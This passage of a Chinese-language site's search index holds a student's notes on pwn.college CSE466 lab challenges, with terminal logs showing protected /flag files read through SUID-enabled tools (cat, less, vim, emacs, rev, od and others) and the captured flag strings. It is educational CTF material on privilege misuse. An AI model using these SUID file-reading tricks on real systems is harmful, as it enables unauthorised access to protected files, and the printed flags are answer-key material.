e0d\u5e38\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6211\u4e00\u76f4\u5728\u4f7f\u7528tldr\uff0c\u4f46tldr\u4e4b\u4e2d\u6ca1\u6709\u4e0d\u5e38\u7528\u7684\u53c2\u6570\uff0c\u56e0\u6b64\u505a\u4e86\u51e0\u4e2a\u9898\u4ee5\u540e\u5c31\u4e0d\u592a\u9002\u5408\u8fd9\u4e2a\u6311\u6218\u4e86\u3002\u540c\u65f6\uff0c\u4f5c\u4e3aCTF\u4eba\uff0c\u5e94\u8be5\u5bf9\u6743\u9650\u5f88\u654f\u611f\uff0c\u5728\u4e00\u4e2a\u5de5\u5177\u6709suid\u7684\u60c5\u51b5\u4e0b\uff0c\u6df1\u6316\u8fd9\u4e2a\u5de5\u5177\u3002\u6211\u60f3\u8fd9\u5c31\u662f\u8fd9\u4e2a\u6a21\u5757\u6240\u80fd\u5e26\u6765\u7684\u542f\u53d1\u4e86\u3002 \u8bb2\u89e3 YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002 \u6211\u53c2\u8003\u8fc7\u7684\u6240\u6709\u94fe\u63a5 \u4e00\u4e2a\u535a\u4e3b \u4e00\u4e2a\u505a\u4e86\u4e0d\u5c11\u7684\u540c\u5b66 \u4e00\u4e2a\u4e0d\u7b97\u7279\u522b\u5177\u4f53\u7684wp \u6709\u4e00\u70b9\u70b9 \u4e5f\u4e0d\u592a\u591a \u4e00\u4e2a\u8001\u54e5\u8bb0\u5f55\u7684\u81ea\u5df1\u4e0d\u4f1a\u7684\u9898\uff0c\u65e0\u5177\u4f53wp \u53ea\u6709babyshell \u90e8\u5206\u9898\u89e3 \u4e00\u4e2a\u795e\u5947\u7684\u8001\u54e5\uff0c\u5168\u662f\u7b14\u8bb0\uff0c\u6ca1\u6709wp \u5fae\u4fe1\u516c\u4f17\u53f7\u6587\u7ae0\uff0c\u53ea\u6709misuse\u90e8\u5206 \u5f88\u591a\u9898\uff0c\u4e0d\u540c\u4eba\u7684\u89e3\u6cd5\u771f\u662f\u4e0d\u4e00\u6837\uff0c\u53ef\u4ee5\u591a\u770b\u770b\uff0c\u53c2\u8003\u7740\u505a\uff0c\u4f1a\u6709\u542f\u53d1\u7684\u3002","title":"ABOUT CSE466"},{"location":"CSE466/#cse466","text":"fall22","title":"CSE466"},{"location":"CSE466/#_1","text":"","title":"\u6a21\u5757\u603b\u7ed3"},{"location":"CSE466/#program-misuse","text":"\u8fd9\u4e2a\u6a21\u5757\u6bd4\u8f83\u57fa\u7840\uff0c\u5927\u90e8\u5206\u662f\u8ba9\u4f60\u8ba4\u8bc6linux\u4e0b\u7684\u5404\u79cd\u5de5\u5177\u3002\u5bf9\u65b0\u4eba\uff08\u6307\u81f3\u5c11\u719f\u6089\u5176\u4e2d\u90e8\u5206\u5de5\u5177\u4f46\u6ca1\u63a5\u89e6\u8fc7CTF\u7684\u4eba\uff09\u6765\u8bf4\u5e94\u8be5\u542f\u53d1\u5f88\u5927\uff0c\u5f88\u591a\u5de5\u5177\u867d\u7136\u8bbe\u8ba1\u51fa\u6765\u5e76\u4e0d\u662f\u4e3a\u4e86\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5176\u652f\u6301\u8c03\u8bd5\u3001\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3001\u751a\u81f3\u662f\u8c03\u7528\u5176\u4ed6\u7a0b\u5e8f\u7b49\u79cd\u79cd\u8fd0\u884c\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u65b9\u6cd5\u5f97\u5230\u6587\u4ef6\u5185\u5bb9\u3002\u5176\u5b9e\u6211\u8ba4\u4e3a\u8fd9\u662f\u8ba9\u4f60\u5173\u6ce8\u90a3\u4e9b\u5de5\u5177\u4e0d\u5e38\u7528\u7684\u529f\u80fd\uff0c\u6bd4\u5982\u6211\u4e00\u76f4\u5728\u4f7f\u7528tldr\uff0c\u4f46tldr\u4e4b\u4e2d\u6ca1\u6709\u4e0d\u5e38\u7528\u7684\u53c2\u6570\uff0c\u56e0\u6b64\u505a\u4e86\u51e0\u4e2a\u9898\u4ee5\u540e\u5c31\u4e0d\u592a\u9002\u5408\u8fd9\u4e2a\u6311\u6218\u4e86\u3002\u540c\u65f6\uff0c\u4f5c\u4e3aCTF\u4eba\uff0c\u5e94\u8be5\u5bf9\u6743\u9650\u5f88\u654f\u611f\uff0c\u5728\u4e00\u4e2a\u5de5\u5177\u6709suid\u7684\u60c5\u51b5\u4e0b\uff0c\u6df1\u6316\u8fd9\u4e2a\u5de5\u5177\u3002\u6211\u60f3\u8fd9\u5c31\u662f\u8fd9\u4e2a\u6a21\u5757\u6240\u80fd\u5e26\u6765\u7684\u542f\u53d1\u4e86\u3002","title":"program misuse"},{"location":"CSE466/#_2","text":"YOUTUBE\u4e0apwn college\u4e0a\u4f20\u4e86\u8001\u5e08\u7684\u8bb2\u89e3\uff0c\u5927\u591a\u6570\u5f88\u7ec6\u81f4\uff0c\u5c11\u90e8\u5206\u6ca1\u6709\u5b8c\u6210\u7ed9\u51fa\u8fc7\u7a0b\uff0c\u4f46\u90fd\u6709\u601d\u8def\uff0c\u9700\u8981\u81ea\u5df1\u53bb\u5b9e\u73b0\u3002\u5176\u5b9e\u5728\u5b9e\u73b0\u4e86\u4e4b\u540e\u53d1\u73b0\u4e5f\u5c31\u662f\u8fd9\u4e48\u56de\u4e8b\u513f\uff0c\u4f46\u662f\u601d\u8003\u7684\u8fc7\u7a0b\u6709\u65f6\u5019\u662f\u75db\u82e6\u7684\u3002","title":"\u8bb2\u89e3"},{"location":"CSE466/#_3","text":"\u4e00\u4e2a\u535a\u4e3b \u4e00\u4e2a\u505a\u4e86\u4e0d\u5c11\u7684\u540c\u5b66 \u4e00\u4e2a\u4e0d\u7b97\u7279\u522b\u5177\u4f53\u7684wp \u6709\u4e00\u70b9\u70b9 \u4e5f\u4e0d\u592a\u591a \u4e00\u4e2a\u8001\u54e5\u8bb0\u5f55\u7684\u81ea\u5df1\u4e0d\u4f1a\u7684\u9898\uff0c\u65e0\u5177\u4f53wp \u53ea\u6709babyshell \u90e8\u5206\u9898\u89e3 \u4e00\u4e2a\u795e\u5947\u7684\u8001\u54e5\uff0c\u5168\u662f\u7b14\u8bb0\uff0c\u6ca1\u6709wp \u5fae\u4fe1\u516c\u4f17\u53f7\u6587\u7ae0\uff0c\u53ea\u6709misuse\u90e8\u5206 \u5f88\u591a\u9898\uff0c\u4e0d\u540c\u4eba\u7684\u89e3\u6cd5\u771f\u662f\u4e0d\u4e00\u6837\uff0c\u53ef\u4ee5\u591a\u770b\u770b\uff0c\u53c2\u8003\u7740\u505a\uff0c\u4f1a\u6709\u542f\u53d1\u7684\u3002","title":"\u6211\u53c2\u8003\u8fc7\u7684\u6240\u6709\u94fe\u63a5"},{"location":"CSE466/program-interaction/","text":"Knowledge wp level1 hacker@program-interaction-level-1:~$ /challenge/embryoio_level1 WELCOME! This challenge makes the following asks of you: - the challenge checks for a specific parent process : bash ONWARDS TO GREATNESS! [INFO] This challenge will now perform a bunch of checks. [INFO] If you pass these checks, you will receive the flag. [TEST] Performing checks on the parent process of this process. [TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then, [TEST] most likely, this is what you do by default anyways, but we'll check just in case... [INFO] The process' executable is /usr/bin/bash. [INFO] This might be different than expected because of symbolic links (for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8). [INFO] To pass the checks, the executable must be bash. [FAIL] You did not satisfy all the execution requirements. [FAIL] Specifically, you must fix the following issue: [FAIL] The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: ['/bin/bash', '--init-file', '/usr/lib/code-server/lib/vscode/out/vs/workbench/contrib/terminal/browser/media/shellIntegration-bash.sh'] hacker@program-interaction-level-1:~$ level2 level3 level4 level5 level6 level7 level8 level9 level10 level11 level12 level13 level14 level15 level16 level17 level18 level19 level20 level21 level22 level23 level24 level25 level26 level27 level28 level29 level30 level31 level32 level33 level34 level35 level36 level37 level38 level39 level40 level41 level42 level43 level44 level45 level46 level47 level48 level49 level50 level51 level52 level53 level54 level55 level56 level57 level58 level59 level60 level61 level62 level63 level64 level65 level66 level67 level68 level70 level71 level72 level73 level74 level76 level77 level78 level79 level80 level82 level83 level84 level85 level86 level87 level88 level89 level90 level91 level92 level93 level94 level95 level96 level97 level98 level99 level100 level101 level102 level103 level104 level105 level106 level107 level108 level109 level110 level111 level112 level113 level114 level115 level116 level117 level118 level119 level120 level121 level122 level123 level124 level125 level126 level127 level128 level129 level130 level131 level132 level133 level134 level135 level136 level137 level138 level139 level140 level141 level142","title":"program interaction"},{"location":"CSE466/program-interaction/#knowledge","text":"","title":"Knowledge"},{"location":"CSE466/program-interaction/#wp","text":"","title":"wp"},{"location":"CSE466/program-interaction/#level1","text":"hacker@program-interaction-level-1:~$ /challenge/embryoio_level1 WELCOME! This challenge makes the following asks of you: - the challenge checks for a specific parent process : bash ONWARDS TO GREATNESS! [INFO] This challenge will now perform a bunch of checks. [INFO] If you pass these checks, you will receive the flag. [TEST] Performing checks on the parent process of this process. [TEST] Checking to make sure the process is the bash shell. If this is a check for the parent process, then, [TEST] most likely, this is what you do by default anyways, but we'll check just in case... [INFO] The process' executable is /usr/bin/bash. [INFO] This might be different than expected because of symbolic links (for example, from /usr/bin/python to /usr/bin/python3 to /usr/bin/python3.8). [INFO] To pass the checks, the executable must be bash. [FAIL] You did not satisfy all the execution requirements. [FAIL] Specifically, you must fix the following issue: [FAIL] The shell process must be running in its default, interactive mode (/bin/bash with no commandline arguments). Your commandline arguments are: ['/bin/bash', '--init-file', '/usr/lib/code-server/lib/vscode/out/vs/workbench/contrib/terminal/browser/media/shellIntegration-bash.sh'] hacker@program-interaction-level-1:~$","title":"level1"},{"location":"CSE466/program-interaction/#level2","text":"","title":"level2"},{"location":"CSE466/program-interaction/#level3","text":"","title":"level3"},{"location":"CSE466/program-interaction/#level4","text":"","title":"level4"},{"location":"CSE466/program-interaction/#level5","text":"","title":"level5"},{"location":"CSE466/program-interaction/#level6","text":"","title":"level6"},{"location":"CSE466/program-interaction/#level7","text":"","title":"level7"},{"location":"CSE466/program-interaction/#level8","text":"","title":"level8"},{"location":"CSE466/program-interaction/#level9","text":"","title":"level9"},{"location":"CSE466/program-interaction/#level10","text":"","title":"level10"},{"location":"CSE466/program-interaction/#level11","text":"","title":"level11"},{"location":"CSE466/program-interaction/#level12","text":"","title":"level12"},{"location":"CSE466/program-interaction/#level13","text":"","title":"level13"},{"location":"CSE466/program-interaction/#level14","text":"","title":"level14"},{"location":"CSE466/program-interaction/#level15","text":"","title":"level15"},{"location":"CSE466/program-interaction/#level16","text":"","title":"level16"},{"location":"CSE466/program-interaction/#level17","text":"","title":"level17"},{"location":"CSE466/program-interaction/#level18","text":"","title":"level18"},{"location":"CSE466/program-interaction/#level19","text":"","title":"level19"},{"location":"CSE466/program-interaction/#level20","text":"","title":"level20"},{"location":"CSE466/program-interaction/#level21","text":"","title":"level21"},{"location":"CSE466/program-interaction/#level22","text":"","title":"level22"},{"location":"CSE466/program-interaction/#level23","text":"","title":"level23"},{"location":"CSE466/program-interaction/#level24","text":"","title":"level24"},{"location":"CSE466/program-interaction/#level25","text":"","title":"level25"},{"location":"CSE466/program-interaction/#level26","text":"","title":"level26"},{"location":"CSE466/program-interaction/#level27","text":"","title":"level27"},{"location":"CSE466/program-interaction/#level28","text":"","title":"level28"},{"location":"CSE466/program-interaction/#level29","text":"","title":"level29"},{"location":"CSE466/program-interaction/#level30","text":"","title":"level30"},{"location":"CSE466/program-interaction/#level31","text":"","title":"level31"},{"location":"CSE466/program-interaction/#level32","text":"","title":"level32"},{"location":"CSE466/program-interaction/#level33","text":"","title":"level33"},{"location":"CSE466/program-interaction/#level34","text":"","title":"level34"},{"location":"CSE466/program-interaction/#level35","text":"","title":"level35"},{"location":"CSE466/program-interaction/#level36","text":"","title":"level36"},{"location":"CSE466/program-interaction/#level37","text":"","title":"level37"},{"location":"CSE466/program-interaction/#level38","text":"","title":"level38"},{"location":"CSE466/program-interaction/#level39","text":"","title":"level39"},{"location":"CSE466/program-interaction/#level40","text":"","title":"level40"},{"location":"CSE466/program-interaction/#level41","text":"","title":"level41"},{"location":"CSE466/program-interaction/#level42","text":"","title":"level42"},{"location":"CSE466/program-interaction/#level43","text":"","title":"level43"},{"location":"CSE466/program-interaction/#level44","text":"","title":"level44"},{"location":"CSE466/program-interaction/#level45","text":"","title":"level45"},{"location":"CSE466/program-interaction/#level46","text":"","title":"level46"},{"location":"CSE466/program-interaction/#level47","text":"","title":"level47"},{"location":"CSE466/program-interaction/#level48","text":"","title":"level48"},{"location":"CSE466/program-interaction/#level49","text":"","title":"level49"},{"location":"CSE466/program-interaction/#level50","text":"","title":"level50"},{"location":"CSE466/program-interaction/#level51","text":"","title":"level51"},{"location":"CSE466/program-interaction/#level52","text":"","title":"level52"},{"location":"CSE466/program-interaction/#level53","text":"","title":"level53"},{"location":"CSE466/program-interaction/#level54","text":"","title":"level54"},{"location":"CSE466/program-interaction/#level55","text":"","title":"level55"},{"location":"CSE466/program-interaction/#level56","text":"","title":"level56"},{"location":"CSE466/program-interaction/#level57","text":"","title":"level57"},{"location":"CSE466/program-interaction/#level58","text":"","title":"level58"},{"location":"CSE466/program-interaction/#level59","text":"","title":"level59"},{"location":"CSE466/program-interaction/#level60","text":"","title":"level60"},{"location":"CSE466/program-interaction/#level61","text":"","title":"level61"},{"location":"CSE466/program-interaction/#level62","text":"","title":"level62"},{"location":"CSE466/program-interaction/#level63","text":"","title":"level63"},{"location":"CSE466/program-interaction/#level64","text":"","title":"level64"},{"location":"CSE466/program-interaction/#level65","text":"","title":"level65"},{"location":"CSE466/program-interaction/#level66","text":"","title":"level66"},{"location":"CSE466/program-interaction/#level67","text":"","title":"level67"},{"location":"CSE466/program-interaction/#level68","text":"","title":"level68"},{"location":"CSE466/program-interaction/#level70","text":"","title":"level70"},{"location":"CSE466/program-interaction/#level71","text":"","title":"level71"},{"location":"CSE466/program-interaction/#level72","text":"","title":"level72"},{"location":"CSE466/program-interaction/#level73","text":"","title":"level73"},{"location":"CSE466/program-interaction/#level74","text":"","title":"level74"},{"location":"CSE466/program-interaction/#level76","text":"","title":"level76"},{"location":"CSE466/program-interaction/#level77","text":"","title":"level77"},{"location":"CSE466/program-interaction/#level78","text":"","title":"level78"},{"location":"CSE466/program-interaction/#level79","text":"","title":"level79"},{"location":"CSE466/program-interaction/#level80","text":"","title":"level80"},{"location":"CSE466/program-interaction/#level82","text":"","title":"level82"},{"location":"CSE466/program-interaction/#level83","text":"","title":"level83"},{"location":"CSE466/program-interaction/#level84","text":"","title":"level84"},{"location":"CSE466/program-interaction/#level85","text":"","title":"level85"},{"location":"CSE466/program-interaction/#level86","text":"","title":"level86"},{"location":"CSE466/program-interaction/#level87","text":"","title":"level87"},{"location":"CSE466/program-interaction/#level88","text":"","title":"level88"},{"location":"CSE466/program-interaction/#level89","text":"","title":"level89"},{"location":"CSE466/program-interaction/#level90","text":"","title":"level90"},{"location":"CSE466/program-interaction/#level91","text":"","title":"level91"},{"location":"CSE466/program-interaction/#level92","text":"","title":"level92"},{"location":"CSE466/program-interaction/#level93","text":"","title":"level93"},{"location":"CSE466/program-interaction/#level94","text":"","title":"level94"},{"location":"CSE466/program-interaction/#level95","text":"","title":"level95"},{"location":"CSE466/program-interaction/#level96","text":"","title":"level96"},{"location":"CSE466/program-interaction/#level97","text":"","title":"level97"},{"location":"CSE466/program-interaction/#level98","text":"","title":"level98"},{"location":"CSE466/program-interaction/#level99","text":"","title":"level99"},{"location":"CSE466/program-interaction/#level100","text":"","title":"level100"},{"location":"CSE466/program-interaction/#level101","text":"","title":"level101"},{"location":"CSE466/program-interaction/#level102","text":"","title":"level102"},{"location":"CSE466/program-interaction/#level103","text":"","title":"level103"},{"location":"CSE466/program-interaction/#level104","text":"","title":"level104"},{"location":"CSE466/program-interaction/#level105","text":"","title":"level105"},{"location":"CSE466/program-interaction/#level106","text":"","title":"level106"},{"location":"CSE466/program-interaction/#level107","text":"","title":"level107"},{"location":"CSE466/program-interaction/#level108","text":"","title":"level108"},{"location":"CSE466/program-interaction/#level109","text":"","title":"level109"},{"location":"CSE466/program-interaction/#level110","text":"","title":"level110"},{"location":"CSE466/program-interaction/#level111","text":"","title":"level111"},{"location":"CSE466/program-interaction/#level112","text":"","title":"level112"},{"location":"CSE466/program-interaction/#level113","text":"","title":"level113"},{"location":"CSE466/program-interaction/#level114","text":"","title":"level114"},{"location":"CSE466/program-interaction/#level115","text":"","title":"level115"},{"location":"CSE466/program-interaction/#level116","text":"","title":"level116"},{"location":"CSE466/program-interaction/#level117","text":"","title":"level117"},{"location":"CSE466/program-interaction/#level118","text":"","title":"level118"},{"location":"CSE466/program-interaction/#level119","text":"","title":"level119"},{"location":"CSE466/program-interaction/#level120","text":"","title":"level120"},{"location":"CSE466/program-interaction/#level121","text":"","title":"level121"},{"location":"CSE466/program-interaction/#level122","text":"","title":"level122"},{"location":"CSE466/program-interaction/#level123","text":"","title":"level123"},{"location":"CSE466/program-interaction/#level124","text":"","title":"level124"},{"location":"CSE466/program-interaction/#level125","text":"","title":"level125"},{"location":"CSE466/program-interaction/#level126","text":"","title":"level126"},{"location":"CSE466/program-interaction/#level127","text":"","title":"level127"},{"location":"CSE466/program-interaction/#level128","text":"","title":"level128"},{"location":"CSE466/program-interaction/#level129","text":"","title":"level129"},{"location":"CSE466/program-interaction/#level130","text":"","title":"level130"},{"location":"CSE466/program-interaction/#level131","text":"","title":"level131"},{"location":"CSE466/program-interaction/#level132","text":"","title":"level132"},{"location":"CSE466/program-interaction/#level133","text":"","title":"level133"},{"location":"CSE466/program-interaction/#level134","text":"","title":"level134"},{"location":"CSE466/program-interaction/#level135","text":"","title":"level135"},{"location":"CSE466/program-interaction/#level136","text":"","title":"level136"},{"location":"CSE466/program-interaction/#level137","text":"","title":"level137"},{"location":"CSE466/program-interaction/#level138","text":"","title":"level138"},{"location":"CSE466/program-interaction/#level139","text":"","title":"level139"},{"location":"CSE466/program-interaction/#level140","text":"","title":"level140"},{"location":"CSE466/program-interaction/#level141","text":"","title":"level141"},{"location":"CSE466/program-interaction/#level142","text":"","title":"level142"},{"location":"CSE466/program-misuse/","text":"knowledge \u57fa\u672c\u77e5\u8bc6 linux\u3001\u547d\u4ee4\u884c\u3001\u8fdb\u7a0b\u3001\u6587\u4ef6\u7cfb\u7edf\u3001\u76ee\u5f55\u3001\u8f6f\u8fde\u63a5\u548c\u786c\u94fe\u63a5\u3001\u8def\u5f84\uff08\u7edd\u5bf9\u3001\u76f8\u5bf9\uff09\u3001\u7ba1\u9053\u3001\u91cd\u5b9a\u5411 ref \u5173\u4e8e\u8f6f\u8fde\u63a5\uff0c\u8fd9\u91cc\u6709\u51e0\u4e2a\u4e0d\u9519\u7684\u53c2\u8003 - \u633a\u6e05\u695a\u7684\u8bb2\u89e3 - \u83dc\u9e1f \u7136\u540e\u662f\u6743\u9650\u3001\u63d0\u6743\u7684\u5185\u5bb9 \u8fd9\u91cc\u9700\u8981\u660e\u767d\u6743\u9650\u3001\u7528\u6237\u3001\u7528\u6237\u7ec4\u8fd9\u4e9b\u6982\u5ff5\uff0c\u4ee5\u53ca\u975e\u5e38\u975e\u5e38\u91cd\u8981\u7684uid gid\u7b49\u5185\u5bb9 SUID: execute with the eUID of the file owner rather than the parent process. SGID: execute with the eGID of the file owner rather than the parent process. Sticky: used for shared directories to limit file removal to file owners. Three different type of user and group IDs: Effective (eUID, eGID): the UID/GID used for most access checks. Real (UID, GID): the \"real\" UID (or GID) of the process owner, used for things such as signal checks. Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges. ref \u4e00\u4e2a\u535a\u5ba2 \u8fd9\u4e2a\u535a\u5ba2\u7684\u98ce\u683c\u6211\u5f88\u559c\u6b22\uff0c\u54ea\u5929\u5077\u8fc7\u6765 challenges useful shell #!/bin/bash # \u8fdb\u5165/challenge\u76ee\u5f55 cd /challenge # \u83b7\u53d6\u8be5\u76ee\u5f55\u4e0b\u552f\u4e00\u7684\u6587\u4ef6\u540d filename=$(ls) # \u6267\u884c\u8be5\u6587\u4ef6 ./$filename then sh filename.sh level1 Lets you directly read the flag! hacker@program-misuse-level-1:/challenge$ ./babysuid_level1 Welcome to ./babysuid_level1! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/cat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cat! hacker@program-misuse-level-1:/challenge$ \u5df2\u7ecf\u7ed9\u6211uid\u4e86\uff0c\u7136\u540e\u6211\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef hacker@program-misuse-level-1:/$ ls bin boot challenge dev etc flag home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var hacker@program-misuse-level-1:/$ cat flag pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW} hacker@program-misuse-level-1:/$ level2 Lets you directly read the flag! hacker@program-misuse-level-2:/challenge$ ./babysuid_level2 Welcome to ./babysuid_level2! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/more. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/more! hacker@program-misuse-level-2:/challenge$ \u8fd9\u4e2a\u662f\u7528 more \u8bfb\u53d6 hacker@program-misuse-level-2:/challenge$ more /flag pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW} hacker@program-misuse-level-2:/challenge$ level3 Lets you directly read the flag! hacker@program-misuse-level-3:/challenge$ ./babysuid_level3 Welcome to ./babysuid_level3! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/less. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/less! hacker@program-misuse-level-3:/challenge$ \u8fd9\u6b21\u662f\u7528 less hacker@program-misuse-level-3:/challenge$ less /flag pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW} /flag (END) less\u6bd4more\u597d\u7528\uff0c\u8bb0\u5f97\u4f7f\u7528q\u9000\u51fa level4 Lets you directly read the flag! hacker@program-misuse-level-4:/challenge$ ./babysuid_level4 Welcome to ./babysuid_level4! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/tail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tail! hacker@program-misuse-level-4:/challenge$ \u7528 tail hacker@program-misuse-level-4:/challenge$ tail /flag pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW} hacker@program-misuse-level-4:/challenge$ \u6211\u73b0\u5728\u731c\u4e0b\u4e00\u4e2a\u7528head level5 Lets you directly read the flag! hacker@program-misuse-level-5:~$ sh file.sh Welcome to ./babysuid_level5! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/head. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/head! hacker@program-misuse-level-5:~$ \u679c\u7136\u7528head hacker@program-misuse-level-5:~$ head /flag pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW} hacker@program-misuse-level-5:~$ level6 Lets you directly read the flag! hacker@program-misuse-level-6:~$ sh file.sh Welcome to ./babysuid_level6! This challenge is part of a series of programs that exposes you to very simple programs that let you directly read the flag. I just set the SUID bit on /usr/bin/sort. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sort! hacker@program-misuse-level-6:~$ sort /flag pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW} hacker@program-misuse-level-6:~$ \u8fd9\u6b21\u5c45\u7136\u662f\u7528sort \u8fd9\u91cc\u505a\u4e00\u4e2a\u5c0f\u603b\u7ed3\uff0c\u4ee5\u4e0a\u8fd9\u51e0\u4e2a\u5de5\u5177\u90fd\u975e\u5e38\u5e38\u7528\uff0c\u800c\u4e14\u7ecf\u5e38\u662f\u7ec4\u5408\u4f7f\u7528\u7684\uff0c\u5efa\u8bae\u4f7f\u7528 man \u9605\u8bfb\u624b\u518c\uff0c\u7136\u540e\u591a\u5c1d\u8bd5\u642d\u914d\u4f7f\u7528\u3002 level7 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-7:~$ sh file.sh Welcome to ./babysuid_level7! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/vim. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/vim! hacker@program-misuse-level-7:~$ vim /flag \u4ece\u6807\u9898\u80fd\u770b\u51fa\u6765\u662f\u7528\u67d0\u79cd\u7f16\u8f91\u5de5\u5177\uff0c\u8fd9\u6b21\u662f vim pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW} \u6211\u731c\u540e\u8fb9\u513f\u5f97\u6709nano emacs\u7b49\u7b49 level8 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-8:~$ sh file.sh Welcome to ./babysuid_level8! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/emacs. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/emacs! \u679c\u7136\u4e0d\u51fa\u6211\u6240\u6599hhh pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW} emacs\u4e5f\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u5b66\u4e00\u5b66\u3002 \u8fd9\u91cc\u9000\u51fa\u547d\u4ee4\u662f level9 Shows you that an over-privileged editor is a very powerful tool! hacker@program-misuse-level-9:~$ sh file.sh Welcome to ./babysuid_level9! This challenge is part of a series of programs that shows you that an over-privileged editor is a very powerful tool, indeed. I just set the SUID bit on /usr/bin/nano. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nano! hacker@program-misuse-level-9:~$ nano /flag \u6211\u679c\u7136\u6599\u4e8b\u5982\u795e pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW} \u9000\u51fa\u547d\u4ee4\u662f level10 Requires you to understand their output to derive the flag from it! \u4e00\u53e5\u9898\u5916\u8bdd\uff0c\u4e0d\u540c\u6311\u6218\u4e4b\u95f4\u65e0\u7f1d\u5207\u6362\u597d\u5feb\u554a\uff0c\u5f88\u9002\u5408Linux\u76f4\u63a5\u7528terminal\u94fe\u63a5\uff01 hacker@program-misuse-level-10:~$ sh file.sh Welcome to ./babysuid_level10! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/rev. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/rev! rev \u662f\u53cd\u5e8f\u8f93\u51fa\u7684\u5de5\u5177 \u4f46\u662f\u96be\u4e0d\u4f4f\u6211 hacker@program-misuse-level-10:~$ rev /flag }WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp hacker@program-misuse-level-10:~$ rev /flag | rev pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW} hacker@program-misuse-level-10:~$ level11 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-11:~$ sh file.sh Welcome to ./babysuid_level11! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/od. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/od! od \u901a\u5e38\u7528\u4e8e\u4ee5\u516b\u8fdb\u5236\u6216\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u663e\u793a\u6587\u4ef6\u7684\u5185\u5bb9\u3002 hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag 000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35 >pwn.college{sKG5< 000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 